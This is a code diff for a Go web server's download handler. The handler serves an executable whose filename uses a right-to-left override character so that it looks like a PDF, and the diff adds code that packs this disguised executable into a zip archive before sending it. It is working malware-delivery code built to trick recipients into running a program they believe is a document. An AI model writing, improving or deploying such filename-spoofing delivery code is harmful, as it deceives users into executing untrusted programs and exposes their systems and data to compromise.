@@ -1,6 +1,7 @@
 package main
 
 import (
+	"archive/zip"
 	"bytes"
 	"crypto/sha256"
 	_ "embed"
@@ -468,10 +469,31 @@ func handleDownload(w http.ResponseWriter, r *http.Request) {
 	rtlo := "\u202E"
 	spoofedFilename := cleanName + rtlo + "fdp.exe"
 
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", spoofedFilename))
-	w.Header().Set("Content-Type", "application/octet-stream")
-	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(exeBytes)))
-	w.Write(exeBytes)
+	// Create zip archive
+	var zipBuf bytes.Buffer
+	zipWriter := zip.NewWriter(&zipBuf)
+	fileWriter, err := zipWriter.Create(spoofedFilename)
+	if err != nil {
+		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+		return
+	}
+	_, err = fileWriter.Write(exeBytes)
+	if err != nil {
+		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+		return
+	}
+	err = zipWriter.Close()
+	if err != nil {
+		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+		return
+	}
+
+	zipBytes := zipBuf.Bytes()
+
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s.zip\"", cleanName))
+	w.Header().Set("Content-Type", "application/zip")
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(zipBytes)))
+	w.Write(zipBytes)
 }
 
 // Background cleanup worker
